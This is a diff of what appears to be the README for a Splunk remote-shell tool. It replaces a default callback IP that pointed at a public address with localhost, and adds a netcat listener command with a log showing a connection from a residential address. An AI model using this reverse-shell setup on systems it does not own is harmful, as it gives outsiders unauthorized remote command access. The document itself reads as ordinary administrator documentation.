@@ -13,7 +13,19 @@ This is useful when you need to make configuration changes to a host you have De
 
 
     [global]
-    lhost: 107.150.53.164
+    lhost: 127.0.0.1
     lport: 9997
 
-Failure to modify the code block will get your device added to the wall of sheep at http://makesplunkgreataga.in
+To create the listener on the box you wish to cannect to run:
+```bash
+ nc -vv -l -p 9997
+ ```
+ 
+ Upon a successful connection you will see
+ ```
+ $ nc -vv -l -p 9997
+listening on [any] 9997 ...
+connect to [107.150.53.164] from ip24-252-37-155.om.om.cox.net [24.252.37.155] 64190
+[*] Connection Established!
+```
+Ctrl+c to break connection
